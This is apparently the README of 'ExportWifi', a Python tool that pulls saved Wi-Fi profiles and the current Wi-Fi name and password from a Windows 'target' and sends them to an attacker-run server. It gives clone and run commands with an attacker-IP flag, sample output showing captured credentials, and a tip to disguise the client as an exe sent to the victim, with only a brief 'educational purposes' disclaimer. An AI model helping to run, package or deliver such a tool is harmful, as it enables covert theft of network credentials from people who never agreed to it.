ExportWifi
==========

Created by: Fawaz Bashiru

This a module which imports WI-FI files and detects the current WI-FI name and the current WI-FI password of the target. Every imported file is going to be saved in the directory where your server is located.

To install ExportWifi simply type:

`git clone https://github.com/Kill0geR/ExportWifi`

In your Terminal

HOW DOES ExportWifi WORK?
-------------------------
The ip address and the port number should be the same so the connection will work

HOW TO USE ExportWifi?
---------------------
Change the directory

`cd ExportWifi`

Start "wifi.py" with

 `python wifi.py -aip 127.0.0.1`
 
 -aip stands for ip of attacker
 
 -cf stands for create file
 
 -ds stands for demon server and means to have the server in your directory
 
 -p stands for ports and displays the port of the attacker
 
 If you need help simply type:
 
 `python wifi.py -help`

Output of Server
---------------
````commandline
Waiting for connection....
Connection with ('127.0.0.1', 53343)

Connection has been established
6 Wifi files have been saved to your directory
The current WI-FI and Password of the target is 

WI-FI: ********* The Wi-Fi of the target will be here 
Password: ******* The password of the target will be here
````


Additional
----------
* You can send "client.py" as an exe file to the target with "auto-py-to-exe"

* ExportWifi is very easy to use.

* The server can be used for any OS. The target can only have a Windows OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.
